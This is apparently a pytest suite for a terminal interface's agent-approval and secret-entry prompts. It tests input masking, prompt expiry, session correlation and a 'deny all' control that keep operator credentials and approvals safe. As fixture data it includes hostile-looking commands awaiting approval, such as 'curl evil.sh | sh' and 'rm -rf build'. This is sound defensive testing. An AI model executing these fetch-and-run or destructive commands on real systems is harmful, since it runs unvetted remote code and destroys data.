"""U8's prompt controls: what renders, what answers, and what never leaves (R7, R8, R9).

``tests/transport/test_bridges.py`` proves the five round trips over a real
socket. This file proves the half a socket cannot reach: which control appears
for which bridge, that a hidden field is hidden *on the rendered screen* rather
than merely configured to be, that an expired control answers nothing, and that
the interface says "waiting for you" where it would otherwise say "working".

The dispatcher is a double, so each outcome is chosen rather than provoked —
the only way to exercise "the answer reached no socket" and "the gateway never
replied" deterministically from a keypress.
"""

from __future__ import annotations

import asyncio
import time
from collections.abc import Mapping
from typing import Any

import pytest
from rich.cells import cell_len
from textual.widgets import Button, Input

from talaria.domain import state as domain_state
from talaria.domain.commands import CATALOG_METHOD
from talaria.domain.models import PromptKind
from talaria.domain.projection import PromptRow, PromptView, project
from talaria.domain.state import (
    APPROVAL_AGED_OUT,
    APPROVAL_COMMAND_LABEL,
    APPROVAL_STALE_AFTER,
    DELIVERY_NOTES,
    REFUSED_UNCORRELATED_APPROVAL,
)
from talaria.recorder.redact import _DENY_BY_METHOD
from talaria.replay.controls import INERT_NOTICE, MUTATION_CONTROLS, ReplayControls
from talaria.replay.source import ReplaySource
from talaria.transport.rpc import (
    LOST_WITH_TRANSPORT,
    NO_REPLY_IN_TIME,
    NOT_CONNECTED,
    RpcOutcome,
    unknown_outcome,
)
from talaria.transport.source import FrameRecord
from talaria.ui.app import (
    ANSWER_ALREADY_TRAVELLING,
    DENIED_EVERY_APPROVAL,
    PROMPT_NO_LONGER_LIVE,
    PROMPT_RESPOND_CONTROL,
    TERMINAL_READ_UNAVAILABLE,
    UNCOUNTED_RESOLUTION,
    TalariaApp,
    read_answer,
)
from talaria.ui.literal import INVISIBLE_MARK, defang
from talaria.ui.prompts import (
    COMMAND_PREVIEW_LINES,
    CONTROL_OFFSCREEN_TITLE,
    DENY_ALL_CHOICE,
    GATEWAY_DISCARDED_ANSWER,
    GATEWAY_HAD_NO_APPROVAL,
    HIDDEN_KINDS,
    NO_CHOICES_FALLBACK,
    RESPOND_METHODS,
    RESPOND_VALUE_FIELDS,
    UNATTENDED_KINDS,
    WAITING_TITLE,
    CommandPanel,
    PromptCard,
    activity_line,
    attended_rows,
    command_overflow_line,
    echoable_answer,
    respond_params,
    withdrawn_activity_line,
    wrap_command,
)
from tests.ui.conftest import (
    RecordingDispatcher,
    event,
    feed,
    live_app,
    records,
    screen_text,
    settle,
)

#: A value distinctive enough that a sweep over a screen, a transcript, or a
#: status document can prove it is absent.
CANARY = "canary-Wq8xTLmv-never-echoed"

#: What Textual's ``Input`` draws instead of a character when ``password`` is
#: set. Transcribed from the widget rather than imported, so a release that
#: changed the glyph would fail this suite instead of silently making its
#: mask assertions unfalsifiable.
MASK_GLYPH = "\u2022"


class ExpiringDispatcher(RecordingDispatcher):
    """A dispatcher that lets a frame arrive *while* the call is outstanding.

    The prompt is out of the registry for exactly the length of one round trip,
    and every defect in that window needs a gateway event delivered inside it.
    A hook on the call is the only way to place one there deterministically.
    """

    def __init__(self, outcome: RpcOutcome | None = None) -> None:
        super().__init__(outcome)
        self.on_call: Any = None

    async def call(
        self,
        method: str,
        params: Mapping[str, Any] | None = None,
        *,
        timeout: float | None = None,
    ) -> RpcOutcome:
        if self.on_call is not None:
            self.on_call()
        return await super().call(method, params, timeout=timeout)


class HoldingDispatcher(RecordingDispatcher):
    """A dispatcher that parks its **first** call until the test releases it.

    The only way to observe the window ``respond_to_prompt`` opens: the prompt
    has left the registry, the frame is on the wire, and the reply has not come
    back. Every in-flight defect lives in that window, and it closes the instant
    the call returns — so a test that lets it close cannot see any of them. Only
    the first call is held, so the escape action the interface offers while an
    answer is travelling can still be exercised in the same test.

    **"First" means the first call an operator made.** ``TalariaApp`` reads
    ``commands.catalog`` once when it mounts in live mode (U9), and holding
    *that* held the wrong call: the respond then completed immediately, the
    window never opened, and four in-flight tests went green over a gate that
    had already been consumed.
    """

    def __init__(self, outcome: RpcOutcome | None = None) -> None:
        super().__init__(outcome)
        self.gate = asyncio.Event()
        self._hold_next = True

    async def call(
        self,
        method: str,
        params: Mapping[str, Any] | None = None,
        *,
        timeout: float | None = None,
    ) -> RpcOutcome:
        self.calls.append((method, dict(params or {})))
        if self._hold_next and method != CATALOG_METHOD:
            self._hold_next = False
            await self.gate.wait()
        if self.outcome is not None:
            return self.outcome
        return RpcOutcome(status="ok", method=method, request_id="1", epoch=1, result={})


# ── the wire contract, checked without a wire ────────────────────────────


def test_every_prompt_kind_has_a_respond_method_and_a_value_field() -> None:
    """A bridge with no entry answers nothing, and the failure is a KeyError
    at the moment the operator presses a key — the worst place to find it."""
    from typing import get_args

    kinds = set(get_args(PromptKind))
    assert set(RESPOND_METHODS) == kinds
    assert set(RESPOND_VALUE_FIELDS) == kinds


def test_the_field_talaria_sends_is_the_field_the_recorder_withholds() -> None:
    """AE3 extension. The deny-set and the sender are two lists of the same
    four names, derived independently from the gateway's own source, and a
    disagreement means Talaria writes a plaintext credential to the frame log
    while every redaction test still passes."""
    for method, denied in _DENY_BY_METHOD.items():
        kind = next(k for k, m in RESPOND_METHODS.items() if m == method)
        assert RESPOND_VALUE_FIELDS[kind] in denied, method


def test_approval_answers_by_session_because_it_has_no_request_id() -> None:
    """``approval.respond`` resolves by session key and never reads a request
    id (``tui_gateway/methods_prompt.py:887-905``). The synthesized registry
    key stays local."""
    params = respond_params(
        "approval", request_id="approval:s1#1", session_id="s1", value="once"
    )
    assert params == {"session_id": "s1", "choice": "once"}
    assert "request_id" not in params


@pytest.mark.parametrize(
    "kind,field", [("clarify", "answer"), ("secret", "value"), ("sudo", "password")]
)
def test_a_blocking_bridge_answers_by_request_id_and_not_by_session(
    kind: PromptKind, field: str
) -> None:
    params = respond_params(kind, request_id="req-1", session_id="s1", value=CANARY)
    assert params == {"request_id": "req-1", field: CANARY}
    assert "session_id" not in params


# ── what may be written down ─────────────────────────────────────────────


def test_only_a_gateway_offered_choice_is_written_to_the_transcript() -> None:
    approval = PromptRow(
        request_id="approval:s1#1",
        kind="approval",
        summary="rm -rf /tmp/x",
        choices=("once", "session", "deny"),
    )
    assert echoable_answer(approval, "once") == "once"
    # Not offered: a value Talaria did not get from the gateway is operator
    # input, whatever bridge it arrived on.
    assert echoable_answer(approval, CANARY) is None

    typed = PromptRow(request_id="req-1", kind="secret", summary="API key for x")
    assert echoable_answer(typed, CANARY) is None


def test_the_activity_line_never_calls_waiting_working() -> None:
    """R8's whole clause. A blocked session has a live socket and an unfinished
    turn, so every "busy" signal is still true — which is exactly why one must
    not be shown."""
    view = PromptView(
        rows=(PromptRow(request_id="r1", kind="sudo", summary="sudo password required"),)
    )
    waiting = activity_line("waiting", view)
    assert "waiting for you" in waiting
    assert "sudo password required" in waiting

    assert activity_line("streaming", PromptView()) == "working…"
    assert activity_line("streaming", PromptView()) != waiting
    assert activity_line("idle", PromptView()) == ""


def test_the_activity_line_counts_the_prompts_it_is_not_naming() -> None:
    view = PromptView(
        rows=(
            PromptRow(request_id="r1", kind="sudo", summary="sudo password required"),
            PromptRow(request_id="r2", kind="clarify", summary="which branch?"),
        )
    )
    assert "(+1 more)" in activity_line("waiting", view)


def test_the_gateway_wait_note_replaces_working_and_nothing_else() -> None:
    """``thinking.delta`` is the live spinner text, and it is more informative
    than ``working…`` — so it takes that slot, and only while there is a turn
    for it to describe."""
    view = PromptView(notice="(◐) indexing...")
    assert activity_line("streaming", view) == "(◐) indexing..."
    assert activity_line("idle", view) == ""
    assert activity_line("cancelled", view) == "interrupted"


def test_a_withdrawal_outranks_the_gateway_wait_note() -> None:
    """Both want the ``streaming`` slot and only one is a correction.

    The withdrawal line is on screen because ``working…`` may be *false* — the
    gateway may still be holding an approval Talaria stopped offering any way to
    answer. A note saying the gateway is indexing is true and beside the point:
    it leaves the operator believing a session that may never move is moving.
    """
    view = PromptView(withdrawn=1, notice="(◐) indexing...")
    assert activity_line("streaming", view) == withdrawn_activity_line(1)


def test_a_prompt_outranks_the_gateway_wait_note() -> None:
    """R8 again. A note about the gateway's own wait must not sit where the line
    saying a human is being waited on would go."""
    view = PromptView(
        rows=(PromptRow(request_id="r1", kind="sudo", summary="sudo password required"),),
        notice="(◐) indexing...",
    )
    assert "waiting for you" in activity_line("waiting", view)


# ── the controls themselves ──────────────────────────────────────────────


@pytest.mark.asyncio
async def test_an_approval_renders_its_choices_and_sends_the_gateways_own_string() -> None:
    """The labels are asserted **on the rendered screen**, and the click is a
    real click.

    Both halves are here because the first version of this card passed the
    widget-level version of this test while showing the operator nothing at all.
    ``card.query(Button)`` found three buttons and ``.press()`` posted the
    message, but every one of those buttons had a content height of zero rows,
    so ``once``, ``session`` and ``deny`` were absent from the screen and a
    mouse click landed on nothing. A test that reaches into the DOM for a widget
    and then calls a method on it is not a test that the interface works.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("message.start", {}))
        feed(
            app,
            event(
                "approval.request",
                {
                    "description": "delete the build directory",
                    "command": "rm -rf build",
                    "choices": ["once", "session", "deny"],
                    "allow_permanent": True,
                },
            ),
        )
        await settle(app, pilot)

        card = app.prompts.card_for("approval:s1#1")
        assert card is not None
        labels = [str(b.label) for b in card.query(Button)]
        assert labels == ["once", "session", "deny"]

        screen = screen_text(app)
        for label in labels:
            assert label in screen, f"{label!r} is not on the screen"
        assert "delete the build directory" in screen
        # Height, not just presence: a control the operator can read occupies
        # rows, and zero rows is exactly how this failed.
        assert all(b.content_size.height >= 1 for b in card.query(Button))

        await pilot.click("#choice-1")
        await settle(app, pilot)
        await settle(app, pilot)

        assert dispatcher.operator_calls == [
            ("approval.respond", {"session_id": "s1", "choice": "session"})
        ]
        assert list(app.prompts.card_ids) == []
        assert any(
            "approval answered: session" in e.text for e in app.state.transcript
        )
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_free_text_control_shows_its_prompt_and_what_is_typed() -> None:
    """The visible half of the free-text bridges. The placeholder tells the
    operator the control is there and Enter sends it; the echo tells them the
    keystrokes are arriving. Neither was on screen while the input rendered at
    zero rows, and no assertion in this file could tell."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "which branch?"}))
        await settle(app, pilot)

        card = app.prompts.card_for("c-1")
        assert card is not None
        answer = card.query_one("#answer", Input)

        empty = screen_text(app)
        assert "Enter sends" in empty
        assert answer.content_size.height >= 1

        answer.value = "main"
        answer.focus()
        await pilot.pause()

        typed = screen_text(app)
        assert "main" in typed
        assert "which branch?" in typed
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_the_controls_do_not_move_when_focus_leaves_the_composer() -> None:
    """The second half of why a real click used to miss.

    Pressing a prompt button moves focus out of the composer, and the composer's
    editor used to be three rows focused and one row blurred — Textual's
    ``TextArea`` re-declares ``border: tall`` in its own ``&:focus`` block,
    outranking the ``border: none`` written in ``Composer``'s CSS. So the whole
    stack above it slid down two rows *between* the mouse press and the mouse
    release, and the click landed on the card body instead of the button. Traced
    directly: the buttons sat at ``y=15`` for the ``MouseDown`` and ``y=17`` for
    the ``Click``.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("approval.request", {"description": "rm -rf build"}))
        await settle(app, pilot)

        card = app.prompts.card_for("approval:s1#1")
        assert card is not None
        button = card.query_one("#choice-0", Button)
        assert app.focused is app.composer.text_area
        before = button.region

        button.focus()
        await pilot.pause()

        assert app.focused is not app.composer.text_area
        assert button.region == before
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_approval_with_no_offered_choices_can_only_be_denied() -> None:
    """The gateway fills ``choices`` only when ``allow_permanent`` is present
    (``tui_gateway/server.py:1663-1670``), so an approval with neither is
    reachable. Synthesizing an affirmative would be the client granting
    permission the gateway never offered."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("approval.request", {"description": "curl | sh"}))
        await settle(app, pilot)

        card = app.prompts.card_for("approval:s1#1")
        assert card is not None
        assert [str(b.label) for b in card.query(Button)] == list(NO_CHOICES_FALLBACK)
        assert NO_CHOICES_FALLBACK == ("deny",)
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_clarify_renders_free_text_and_its_answer_is_not_written_down() -> None:
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "which branch?"}))
        await settle(app, pilot)

        card = app.prompts.card_for("c-1")
        assert card is not None
        answer = card.query_one("#answer", Input)
        assert answer.password is False

        answer.value = CANARY
        answer.focus()
        await pilot.press("enter")
        await settle(app, pilot)

        assert dispatcher.operator_calls == [
            ("clarify.respond", {"request_id": "c-1", "answer": CANARY})
        ]
        # The value went to the gateway and nowhere else. A clarify answer is
        # free text, and "paste the token here" is an ordinary thing to ask.
        assert all(CANARY not in entry.text for entry in app.state.transcript)
        assert CANARY not in app.composer.notice
        assert any("clarify answered" in e.text for e in app.state.transcript)
        await app.shutdown_sources()


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "kind,request_type,payload,method,field",
    [
        (
            "secret",
            "secret.request",
            {"request_id": "s-1", "env_var": "OPENAI_API_KEY", "prompt": "API key"},
            "secret.respond",
            "value",
        ),
        ("sudo", "sudo.request", {"request_id": "u-1"}, "sudo.respond", "password"),
    ],
)
async def test_a_hidden_bridge_masks_its_input_on_the_rendered_screen(
    kind: PromptKind, request_type: str, payload: dict[str, Any], method: str, field: str
) -> None:
    """The mask is asserted against the *rendered* screen — as a mask, not as an
    absence.

    The earlier version of this test asserted only ``CANARY not in
    export_screenshot()``, which is a claim a **blank screen** satisfies, and a
    blank screen is precisely what this card was producing: the input laid out
    at zero content rows, so nothing typed into it appeared masked or otherwise.
    Deleting ``password=self.row.kind in HIDDEN_KINDS`` left the suite green.

    So the positive assertion carries the weight. One mask glyph per character
    of the value must be on screen, which is false both when the value is echoed
    in plain text and when nothing renders at all; the negative assertion then
    means something, because the same string is proven not to be empty.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)
    request_id = str(payload["request_id"])

    async with app.run_test() as pilot:
        feed(app, event(request_type, payload))
        await settle(app, pilot)

        card = app.prompts.card_for(request_id)
        assert card is not None
        answer = card.query_one("#answer", Input)
        assert kind in HIDDEN_KINDS

        answer.value = CANARY
        answer.focus()
        await pilot.pause()

        masked = screen_text(app)
        assert masked.count(MASK_GLYPH) == len(CANARY)
        assert CANARY not in masked
        # …and no leading fragment of it either, which a mask applied to only
        # part of the field would leave behind.
        assert CANARY[:8] not in masked

        await pilot.press("enter")
        await settle(app, pilot)

        assert dispatcher.operator_calls == [(method, {"request_id": request_id, field: CANARY})]
        # Every operator-facing surface this process owns, swept together. The
        # screen sweep is paired with a positive: the answered card is gone and
        # the transcript line that replaced it is readable.
        after = screen_text(app)
        assert CANARY not in after
        assert f"{kind} answered" in after
        assert all(CANARY not in entry.text for entry in app.state.transcript)
        assert CANARY not in app.composer.notice
        assert CANARY not in repr(project(app.state, mode="live").status.to_json_dict())
        assert answer.value == ""
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_terminal_read_never_renders_a_control() -> None:
    """F2: the projection answers it "without creating a human overlay"."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("terminal.read.request", {"request_id": "t-1"}))
        await settle(app, pilot)

        assert "terminal_read" in UNATTENDED_KINDS
        assert list(app.prompts.card_ids) == []
        assert app.prompts.card_for("t-1") is None
        assert [method for method, _ in dispatcher.operator_calls] == ["terminal.read.respond"]
        await app.shutdown_sources()


# ── R8: expiry, and the answer that arrives too late ─────────────────────


@pytest.mark.asyncio
async def test_expiry_clears_the_control_and_leaves_a_permanent_marker() -> None:
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("sudo.request", {"request_id": "u-1"}))
        await settle(app, pilot)
        assert list(app.prompts.card_ids) == ["u-1"]

        feed(app, event("sudo.expire", {"request_id": "u-1"}), seq=101)
        await settle(app, pilot)

        assert list(app.prompts.card_ids) == []
        markers = [e.text for e in app.state.transcript if e.kind == "prompt-expired"]
        assert markers == ["sudo prompt expired unanswered: sudo password required"]
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_answer_that_arrives_after_the_expiry_sends_nothing() -> None:
    """The keystroke and the expiry race, and the registry is the arbiter. The
    gateway would tolerate the late respond — ``allow_expired=True`` answers
    ``{"status": "expired"}`` — but tolerating it is not routing it."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test():
        feed(app, event("secret.request", {"request_id": "s-1", "env_var": "TOKEN"}))
        await app.render_snapshot()
        feed(app, event("secret.expire", {"request_id": "s-1"}), seq=101)
        await app.render_snapshot()

        outcome = await app.respond_live("s-1", CANARY)

        assert outcome is None
        assert dispatcher.operator_calls == []
        assert app.composer.notice == PROMPT_NO_LONGER_LIVE
        assert app.state.rejected_responses == 1
        await app.shutdown_sources()


# ── R9: correlation, both halves ─────────────────────────────────────────


@pytest.mark.asyncio
async def test_a_prompt_for_another_session_never_renders() -> None:
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("message.start", {}, session="s1"))
        feed(app, event("clarify.request", {"request_id": "c-2", "question": "b?"}, session="s2"))
        await settle(app, pilot)

        assert app.state.focused_session_id == "s1"
        assert list(app.prompts.card_ids) == []
        assert app.state.cross_session_events_ignored == 1
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_answer_for_a_session_that_moved_on_is_refused() -> None:
    """The registry holds the session each live id belongs to, so a control
    that outlived a focus change cannot deliver its answer to whatever question
    the new session is asking."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test():
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "which?"}))
        await app.render_snapshot()
        assert app.state.prompt_for("c-1") is not None

        # The focus moves without clearing the registry, which is the only
        # arrangement in which the id half of the guard passes and the session
        # half has to do the work.
        from dataclasses import replace

        app.state = replace(app.state, focused_session_id="s2")

        outcome = await app.respond_live("c-1", CANARY)

        assert outcome is None
        assert dispatcher.operator_calls == []
        assert app.state.rejected_responses == 1
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_control_answers_its_own_request_and_not_its_neighbour() -> None:
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "first?"}))
        feed(app, event("secret.request", {"request_id": "s-2", "env_var": "TOKEN"}), seq=101)
        await settle(app, pilot)
        assert list(app.prompts.card_ids) == ["c-1", "s-2"]

        second = app.prompts.card_for("s-2")
        assert second is not None
        second.query_one("#answer", Input).value = CANARY
        second.query_one("#answer", Input).focus()
        await pilot.press("enter")
        await settle(app, pilot)

        assert dispatcher.operator_calls == [
            ("secret.respond", {"request_id": "s-2", "value": CANARY})
        ]
        # The neighbour is untouched, and it is the *first* card that survives —
        # an index-based reconciliation removes the last one instead.
        assert list(app.prompts.card_ids) == ["c-1"]
        await app.shutdown_sources()


# ── the unconfirmed answers ──────────────────────────────────────────────


@pytest.mark.asyncio
async def test_an_expiry_arriving_after_a_successful_answer_says_nothing() -> None:
    """The other side of the in-flight set: it has to be emptied.

    A request id left in ``answering`` after its answer landed is an id a much
    later ``.expire`` can still match — and it would write "expired unanswered"
    into the transcript for a question the operator answered, which is a false
    entry in the one record that says what was allowed.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("sudo.request", {"request_id": "u-1"}))
        await settle(app, pilot)

        await app.respond_live("u-1", CANARY)
        await settle(app, pilot)
        assert any("sudo answered" in e.text for e in app.state.transcript)
        assert app.state.answering == ()

        feed(app, event("sudo.expire", {"request_id": "u-1"}), seq=102)
        await settle(app, pilot)

        assert [e.text for e in app.state.transcript if e.kind == "prompt-expired"] == []
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_expiry_during_the_call_leaves_a_marker_and_no_resurrected_control() -> None:
    """The window between clearing the prompt and the reply landing.

    ``respond_to_prompt`` takes the prompt out of the registry before the call
    goes out, so an arriving ``sudo.expire`` used to match nothing: no
    ``prompt-expired`` line, and — the damaging half — no entry in
    ``flushed_prompt_ids``. The failed answer then called ``restore_prompt``,
    whose first guard reads that very set, and put the control back for a bridge
    the gateway had already closed. No second expiry is ever emitted for it, so
    the control stayed on screen and the turn stayed at ``waiting`` for the rest
    of the session.
    """
    dispatcher = ExpiringDispatcher(unknown_outcome("sudo.respond", NOT_CONNECTED, epoch=0))
    app = live_app(dispatcher)
    dispatcher.on_call = lambda: feed(app, event("sudo.expire", {"request_id": "u-1"}), seq=101)

    async with app.run_test() as pilot:
        feed(app, event("sudo.request", {"request_id": "u-1"}))
        await settle(app, pilot)
        assert list(app.prompts.card_ids) == ["u-1"]

        await app.respond_live("u-1", CANARY)
        await settle(app, pilot)

        markers = [e.text for e in app.state.transcript if e.kind == "prompt-expired"]
        assert markers == ["sudo prompt expired unanswered: sudo password required"]
        assert "u-1" in app.state.flushed_prompt_ids
        assert list(app.prompts.card_ids) == []
        assert app.state.prompt_for("u-1") is None
        assert app.state.answering == ()
        assert project(app.state, mode="live").status.turn != "waiting"
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_answer_that_reached_no_socket_puts_the_control_back() -> None:
    """``not_sent`` is the one outcome that is definite about non-delivery, so
    it is the only one where re-offering the question is safe."""
    dispatcher = RecordingDispatcher(
        unknown_outcome("sudo.respond", NOT_CONNECTED, epoch=0)
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("sudo.request", {"request_id": "u-1"}))
        await settle(app, pilot)

        await app.respond_live("u-1", CANARY)
        await settle(app, pilot)

        assert list(app.prompts.card_ids) == ["u-1"]
        assert app.state.prompt_for("u-1") is not None
        assert any("not answered" in e.text for e in app.state.transcript)
        assert CANARY not in app.export_screenshot()
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_answer_that_may_have_arrived_is_not_offered_again() -> None:
    """A dropped connection leaves the answer's fate unknown, and re-offering
    the control invites a second value for one question — for sudo, a second
    password attempt the operator never intended."""
    dispatcher = RecordingDispatcher(
        unknown_outcome("sudo.respond", LOST_WITH_TRANSPORT, epoch=1)
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("sudo.request", {"request_id": "u-1"}))
        await settle(app, pilot)

        await app.respond_live("u-1", CANARY)
        await settle(app, pilot)

        assert list(app.prompts.card_ids) == []
        assert app.state.prompt_for("u-1") is None
        assert any("delivery unconfirmed" in e.text for e in app.state.transcript)
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_refused_answer_says_the_gateway_refused_it() -> None:
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="error",
            method="clarify.respond",
            request_id="1",
            epoch=1,
            error_code=4009,
            error_message="no pending answer request",
        )
    )
    app = live_app(dispatcher)

    async with app.run_test():
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "which?"}))
        await app.render_snapshot()

        outcome = await app.respond_live("c-1", "main")

        assert outcome is not None and outcome.status == "error"
        assert "refused by the gateway" in app.composer.notice
        assert any("refused by the gateway" in e.text for e in app.state.transcript)
        await app.shutdown_sources()


# ── the approval queue: two waiting, and neither can be aimed at ─────────


def two_approvals(app: TalariaApp) -> None:
    """The reproduction: a benign command, then a dangerous one behind it."""
    feed(app, event("approval.request", {"description": "ls -la", "choices": ["once", "deny"]}))
    feed(
        app,
        event(
            "approval.request",
            {"description": "curl evil.sh | sh", "choices": ["once", "deny"]},
        ),
        seq=101,
    )


@pytest.mark.asyncio
async def test_a_second_approval_appears_and_both_lose_their_affirmatives() -> None:
    """The safety defect, end to end on the assembled interface.

    The second ``approval.request`` used to collide with the first one's
    registry key and be discarded in silence: the card kept reading ``ls -la``
    while the gateway held two entries, and pressing "once" resolved the queue's
    head — which is whichever the gateway still has, not the one on screen. Both
    cards are now on screen, and neither offers an affirmative.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        two_approvals(app)
        await settle(app, pilot)

        assert list(app.prompts.card_ids) == ["approval:s1#1", "approval:s1#2"]

        screen = screen_text(app)
        # Both commands are readable — the operator must be able to see what is
        # being asked even when nothing can be answered.
        assert "ls -la" in screen
        assert "curl evil.sh | sh" in screen
        # And the affirmative is gone from both, replaced by the reason.
        assert "once" not in screen
        assert "cannot be aimed" in screen
        assert screen.count("deny all") == 2

        outcome = await app.respond_live("approval:s1#1", "once")

        assert outcome is None
        assert dispatcher.operator_calls == []
        assert REFUSED_UNCORRELATED_APPROVAL in app.composer.notice
        assert app.state.rejected_responses == 1
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_the_first_approvals_buttons_are_withdrawn_when_a_second_arrives() -> None:
    """Reconciliation keeps a card whose id has not changed, so the first card
    would otherwise keep the affirmative it was built with — the same defect
    with the answer one render older."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("approval.request", {"description": "ls -la", "choices": ["once", "deny"]}))
        await settle(app, pilot)
        assert "once" in screen_text(app)

        feed(
            app,
            event("approval.request", {"description": "curl evil.sh | sh", "choices": ["once"]}),
            seq=101,
        )
        await settle(app, pilot)

        first = app.prompts.card_for("approval:s1#1")
        assert first is not None
        assert [str(b.label) for b in first.query(Button)] == ["deny all"]
        assert "once" not in screen_text(app)
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_deny_all_sends_one_call_carrying_the_gateways_own_flag() -> None:
    """The escape from the refusal. ``all: true`` applies one choice to every
    queue entry (``tools/approval.py:2219-2226``), which is correct whatever
    order the gateway holds them in — so it is the only answer Talaria will send
    without correlation, and only ever as a denial."""
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="ok",
            method="approval.respond",
            request_id="1",
            epoch=1,
            result={"resolved": 2},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        two_approvals(app)
        await settle(app, pilot)

        await pilot.click("#deny-all")
        await settle(app, pilot)
        await settle(app, pilot)

        assert dispatcher.operator_calls == [
            ("approval.respond", {"session_id": "s1", "choice": "deny", "all": True})
        ]
        assert list(app.prompts.card_ids) == []
        assert app.state.outstanding_approvals("s1") == ()
        assert any(
            f"{DENIED_EVERY_APPROVAL}: 2 waiting, 2 resolved" in e.text
            for e in app.state.transcript
        ), [e.text for e in app.state.transcript]
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_deny_all_never_carries_an_affirmative() -> None:
    """The one line that would turn this control into the defect it exists to
    prevent: one affirmative applied to every command in a queue nobody read."""
    assert DENY_ALL_CHOICE == "deny"
    params = respond_params(
        "approval", request_id="", session_id="s1", value=DENY_ALL_CHOICE, all_approvals=True
    )
    assert params == {"session_id": "s1", "choice": "deny", "all": True}
    # And the flag is off by default, so a single answer cannot resolve a queue.
    assert "all" not in respond_params(
        "approval", request_id="", session_id="s1", value="once"
    )


# ── the gateway's own body, which a confirmed envelope does not read ─────


@pytest.mark.asyncio
async def test_an_answer_the_gateway_discarded_is_not_written_as_answered() -> None:
    """``_respond(..., allow_expired=True)`` returns a JSON-RPC **success** whose
    body is ``{"status": "expired"}`` (``tui_gateway/server.py:10228-10235``) —
    the answer was thrown away. ``delivery_of`` reads the envelope and reports
    ``confirmed``, so without reading the body the transcript claimed the sudo
    password had been answered."""
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="ok",
            method="sudo.respond",
            request_id="1",
            epoch=1,
            result={"status": "expired"},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("sudo.request", {"request_id": "u-1"}))
        await settle(app, pilot)

        outcome = await app.respond_live("u-1", CANARY)
        await settle(app, pilot)

        assert outcome is not None and outcome.confirmed
        assert any(
            f"sudo not answered — {GATEWAY_DISCARDED_ANSWER}" in e.text
            for e in app.state.transcript
        )
        assert not any("sudo answered" in e.text for e in app.state.transcript)
        assert GATEWAY_DISCARDED_ANSWER in app.composer.notice
        # Still cleared: the gateway is not listening, so re-offering the
        # control would put a dead question back on screen.
        assert list(app.prompts.card_ids) == []
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_approval_that_resolved_nothing_is_not_written_as_answered() -> None:
    """The approval half of the same rule. ``approval.respond`` answers
    ``{"resolved": n}``, and zero means the queue was empty — the approval had
    already timed out server-side, where nothing is emitted to say so."""
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="ok",
            method="approval.respond",
            request_id="1",
            epoch=1,
            result={"resolved": 0},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("approval.request", {"description": "rm -rf build", "choices": ["once"]}))
        await settle(app, pilot)

        await app.respond_live("approval:s1#1", "once")
        await settle(app, pilot)

        assert any(
            f"approval not answered — {GATEWAY_HAD_NO_APPROVAL}" in e.text
            for e in app.state.transcript
        )
        assert not any("approval answered" in e.text for e in app.state.transcript)
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_resolved_approval_is_still_written_as_answered() -> None:
    """The discriminating half of the two tests above: a gateway that *did* use
    the answer must still produce the audit line, or "never claim answered"
    would be satisfied by never claiming anything."""
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="ok",
            method="approval.respond",
            request_id="1",
            epoch=1,
            result={"resolved": 1},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("approval.request", {"description": "rm -rf build", "choices": ["once"]}))
        await settle(app, pilot)

        await app.respond_live("approval:s1#1", "once")
        await settle(app, pilot)

